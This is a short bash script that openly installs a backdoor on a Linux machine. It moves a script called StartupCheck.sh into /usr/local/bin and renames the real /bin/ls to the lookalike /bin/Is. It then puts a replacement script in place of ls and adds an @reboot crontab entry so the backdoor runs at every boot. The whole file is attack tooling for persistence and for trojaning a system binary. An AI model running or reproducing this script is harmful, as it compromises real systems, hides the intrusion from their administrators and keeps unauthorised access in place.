#!/bin/bash

BACKDOOR_SCRIPT_LOCATION="/usr/local/bin/"

mv StartupCheck.sh "${BACKDOOR_SCRIPT_LOCATION}"
mv /bin/ls /bin/Is
mv new_ls.sh /bin/ls

crontab -l | { cat; echo "@reboot ${BACKDOOR_SCRIPT_LOCATION}StartupCheck.sh"; } | crontab -